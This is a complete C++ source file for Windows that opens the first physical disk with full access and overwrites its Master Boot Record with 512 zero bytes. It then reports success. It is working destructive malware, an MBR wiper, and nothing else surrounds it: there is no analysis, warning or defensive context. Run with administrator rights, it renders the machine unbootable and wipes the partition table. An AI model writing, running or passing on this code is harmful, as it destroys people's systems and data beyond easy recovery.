#include <Windows.h>
#include <iostream>

#define MBR_SIZE 512
int main()
{
	DWORD write;
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE)
		{
			std::cout << "Master Boot Record is over written" << std::endl;
			Sleep(5000);
			ExitProcess(0);
		}
		else
		{
			std::cout << "Fail";
			Sleep(5000);
			ExitProcess(0);
		}
		return EXIT_SUCCESS;
}